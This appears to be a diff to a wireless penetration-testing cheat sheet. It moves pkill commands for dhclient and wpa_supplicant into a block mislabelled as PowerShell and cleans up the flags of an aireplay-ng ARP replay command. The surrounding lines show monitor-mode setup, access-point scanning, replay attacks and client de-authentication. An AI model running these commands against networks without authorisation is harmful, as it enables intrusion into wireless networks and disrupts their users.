@@ -54,7 +54,9 @@ airmon-ng stop mon0
 # check and kill processes that could interfere with our monitor mode
 airmon-ng check
 airmon-ng check kill
-# pkill dhclient; pkill wpa_supplicant; pkill dhclient3
+```powershell
+pkill dhclient; pkill wpa_supplicant; pkill dhclient3
+```
 
 # list AP
 airodump-ng mon0
@@ -120,7 +122,7 @@ aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0
  * ATTACKER_MAC if fake authentication launched
  * CONNECTED_MAC if a client is associated
 
-# –x 1000 –n 1000 ?
+# -x 1000 -n 1000
 # aireplay-ng -3 –x 1000 –n 1000 –b $AP_MAC -h $ATTACKER_MAC wlan0mon
 # wait for ARP on the network
 # alternatively you can de-auth some clients
